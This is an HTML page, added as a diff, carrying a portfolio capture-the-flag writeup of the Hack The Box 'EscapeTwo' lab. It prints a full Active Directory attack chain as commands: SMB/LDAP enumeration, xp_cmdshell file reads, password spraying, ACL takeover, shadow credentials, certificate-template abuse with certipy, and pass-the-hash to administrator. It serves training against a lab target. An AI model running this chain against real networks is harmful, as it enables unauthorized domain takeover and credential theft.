@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="HTB EscapeTwo parsed writeup with full section flow, commands, notes, and screenshot evidence." />
+  <title>HTB EscapeTwo Writeup | Will DeDominico</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="../assets/css/style.css" />
+</head>
+<body>
+  <div class="background-noise" aria-hidden="true"></div>
+  <header class="site-header">
+    <div class="logo-lockup">
+      <div class="logo-mark" aria-hidden="true">💾</div>
+      <a href="../index.html#home" class="logo-type">Will<span>DeDominico</span></a>
+    </div>
+    <button class="nav-toggle" aria-expanded="false" aria-controls="site-nav">
+      <span class="sr-only">Toggle navigation</span>
+      <span></span>
+      <span></span>
+    </button>
+    <nav id="site-nav" class="site-nav" aria-expanded="false">
+      <a href="../index.html#home">Home</a>
+      <a href="../index.html#experience">Experience</a>
+      <a href="../index.html#projects">Projects</a>
+      <a href="../index.html#writeups" class="is-active">Writeups</a>
+      <a href="../index.html#github">GitHub</a>
+      <a href="../index.html#ctf">CTFs</a>
+      <a href="../index.html#htb">HTB</a>
+      <a href="../index.html#clubs">Clubs</a>
+      <a href="../index.html#education">Education</a>
+    </nav>
+  </header>
+
+  <main>
+    <article class="section blog-layout post-content" aria-labelledby="post-title">
+      <header>
+        <h1 id="post-title">HTB EscapeTwo Writeup</h1>
+        <div class="post-meta">
+          <time datetime="2025-06-08">June 8, 2025</time>
+          <span>14 minute read</span>
+          <div class="post-tags" aria-label="Topics">
+            <span class="post-tag">HTB</span>
+            <span class="post-tag">Easy</span>
+            <span class="post-tag">Windows</span>
+            <span class="post-tag">LDAP</span>
+            <span class="post-tag">SMB</span>
+            <span class="post-tag">AD CS</span>
+          </div>
+        </div>
+      </header>
+
+      <figure class="post-hero">
+        <img src="../assets/img/writeups/htb-escapetwo.png" alt="First page preview of the HTB EscapeTwo writeup PDF report" />
+        <figcaption>Parsed from your HTB EscapeTwo PDF report. Target profile: Easy Windows AD/SQL/CA stack.</figcaption>
+      </figure>
+
+      <div class="post-body">
+        <p><strong>Description (parsed):</strong> EscapeTwo is tagged easy but requires solid LDAP, SMB, SQL, and AD certificate exploitation fundamentals to reach administrator access.</p>
+
+        <div class="content-card">
+          <h3>Default Credentials (as documented)</h3>
+          <ul>
+            <li><code>rose / KxEPkKe6R8su</code></li>
+          </ul>
+        </div>
+
+        <div class="content-card">
+          <h3>Tools Used</h3>
+          <ul>
+            <li>nmap</li>
+            <li>netexec</li>
+            <li>impacket</li>
+            <li>bloodhound</li>
+            <li>bloodyAD</li>
+            <li>smbclient</li>
+            <li>evil-winrm</li>
+            <li>certipy</li>
+          </ul>
+        </div>
+
+        <h2>Enumeration</h2>
+        <h3>Port Scanning - Nmap</h3>
+        <figure class="writeup-shot">
+          <img src="../assets/img/writeups/htb-escapetwo/page-02.png" alt="EscapeTwo report screenshot showing port scanning results" />
+          <figcaption>EscapeTwo · Port scanning and early service visibility.</figcaption>
+        </figure>
+        <pre><code class="language-bash">nmap -A -T5 -oN nmap.txt 10.10.x.x --min-rate 2000 -Pn</code></pre>
+        <p>The Nmap scan reveals a large service surface, including AD domain controller behavior, certificate authority infrastructure, SQL services, and SMB exposure.</p>
+
+        <h3>LDAP / SMB Enumeration</h3>
+        <figure class="writeup-shot">
+          <img src="../assets/img/writeups/htb-escapetwo/page-04.png" alt="EscapeTwo report screenshot showing LDAP and SMB enumeration commands" />
+          <figcaption>EscapeTwo · LDAP and SMB user/share discovery.</figcaption>
+        </figure>
+        <pre><code class="language-bash">netexec ldap 10.10.x.x -u rose -p KxEPkKe6R8su --users
+smbclient -L //10.10.x.x/ -U rose
+smbclient \"//10.10.x.x/Accounting Department\" -U rose</code></pre>
+        <p>LDAP user discovery and readable SMB shares expose the initial credential graph and document storage that contains additional secrets.</p>
+
+        <h3>SQL Enumeration and Credential Discovery</h3>
+        <figure class="writeup-shot">
+          <img src="../assets/img/writeups/htb-escapetwo/page-06.png" alt="EscapeTwo report screenshot showing SQL client and xp_cmdshell usage" />
+          <figcaption>EscapeTwo · SQL client access and config extraction.</figcaption>
+        </figure>
+        <pre><code class="language-bash">mssqlclient.py 'sa:[password]'@10.10.x.x
+EXEC xp_cmdshell 'type \\SQL2019\\ExpressAdv_ENU\\sql-Configuration.INI';</code></pre>
+        <p>Recovered SQL-side configuration data yields additional credentials used later for spray-based foothold and privilege pathing.</p>
+
+        <h2>Foothold</h2>
+        <figure class="writeup-shot">
+          <img src="../assets/img/writeups/htb-escapetwo/page-08.png" alt="EscapeTwo report screenshot showing credential spray and winrm foothold" />
+          <figcaption>EscapeTwo · Password spray to WinRM foothold.</figcaption>
+        </figure>
+        <pre><code class="language-bash">nxc smb 10.10.x.x -u users.txt -p pass.txt
+evil-winrm -i 10.10.x.x -u ryan -p [password]</code></pre>
+        <p>The writeup assembles discovered users/passwords into spray lists, validates SMB auth, then pivots to WinRM-capable credentials for shell access as <code>ryan</code>.</p>
+
+        <div class="callout callout--info" data-label="Operator Note">
+          <p>The report highlights that protocol-specific spray sequencing can reduce time to useful creds (SMB first, WinRM second).</p>
+        </div>
+
+        <h2>Privilege Escalation via AD CS</h2>
+        <p>The escalation path in the PDF is structured in three stages: take ownership of <code>ca_svc</code>, abuse shadow credentials, then request/authenticate administrator cert material.</p>
+
+        <h3>Step 1: Control CA Service Account</h3>
+        <figure class="writeup-shot">
+          <img src="../assets/img/writeups/htb-escapetwo/page-12.png" alt="EscapeTwo report screenshot showing AD CS account ownership abuse workflow" />
+          <figcaption>EscapeTwo · Step 1 ownership and ACL control.</figcaption>
+        </figure>
+        <pre><code class="language-bash">bloodyAD -u ryan -p [password] -d sequel.htb --host dc01.sequel.htb set owner ca_svc ryan
+dacledit.py -action write -rights FullControl -principal ryan -target ca_svc sequel.htb/ryan:[password]
+certipy-ad shadow auto -u ryan@sequel.htb -p [password] -account ca_svc</code></pre>
+
+        <h3>Step 2: Abuse Vulnerable Template</h3>
+        <figure class="writeup-shot">
+          <img src="../assets/img/writeups/htb-escapetwo/page-13.png" alt="EscapeTwo report screenshot showing vulnerable certificate template abuse" />
+          <figcaption>EscapeTwo · Step 2 vulnerable template abuse.</figcaption>
+        </figure>
+        <pre><code class="language-bash">certipy-ad find -u ryan@sequel.htb -p [password]
+KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -dc-ip 10.10.x.x -target dc01.sequel.htb</code></pre>
+
+        <h3>Step 3: Authenticate as Administrator</h3>
+        <figure class="writeup-shot">
+          <img src="../assets/img/writeups/htb-escapetwo/page-14.png" alt="EscapeTwo report screenshot showing administrator certificate auth and pass-the-hash" />
+          <figcaption>EscapeTwo · Step 3 admin authentication and pass-the-hash.</figcaption>
+        </figure>
+        <pre><code class="language-bash">certipy -ad req -u ca_svc -hashes :[ca_svc_NT_hash] -ca sequel-DC01-CA -template DunderMifflinAuthentication -target DC01.sequel.htb -dc-ip 10.10.x.x -dns 10.10.x.x -ns 10.10.x.x -upn administrator@sequel.htb
+certipy-ad auth -pfx administrator_10.pfx -domain sequel.htb
+evil-winrm -i 10.10.x.x -u administrator -H [NT_hash]</code></pre>
+
+        <div class="callout callout--warning" data-label="Notes">
+          <p>The report explicitly distinguishes LM vs NT hash output and uses pass-the-hash directly instead of cracking, which keeps time-to-root low.</p>
+        </div>
+
+      </div>
+
+      <footer class="post-footer">
+        <p>Full technical report source:</p>
+        <a class="button primary" href="https://github.com/Moriz82/WriteUps-and-Reports/blob/main/HTB/HTB%20EscapeTwo%20Write%20Up.pdf" target="_blank" rel="noopener">Open Original PDF</a>
+        <a class="button ghost" href="../index.html#writeups">Back to Writeups</a>
+      </footer>
+    </article>
+  </main>
+
+  <footer class="site-footer">
+    <p>© <span id="copyright-year"></span> Will DeDominico · Field-tested from San Antonio, TX.</p>
+  </footer>
+
+  <script src="../assets/js/main.js"></script>
+</body>
+</html>
